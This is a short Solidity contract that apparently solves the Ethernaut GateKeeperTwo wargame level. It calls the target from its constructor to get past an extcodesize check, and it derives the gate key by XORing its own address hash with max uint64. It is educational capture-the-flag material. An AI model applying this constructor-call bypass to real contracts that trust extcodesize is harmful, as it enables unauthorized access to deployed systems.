// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IGateKeeperTwo {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract AttackGateKeeperTwo {
    constructor(address _levelInstance) {
        address orgContract = _levelInstance;
        unchecked {
            bytes8 gateKey = bytes8(
                uint64(bytes8(keccak256(abi.encodePacked(this)))) ^
                    (uint64(0) - 1)
            );
            IGateKeeperTwo(orgContract).enter(gateKey);
        }
    }
}

// This contract require the caller put all codes in constructor since the extcodesize(caller()) has == 0
// After run it at remix, check it with await contract.entrant(); will return the tx.origin()
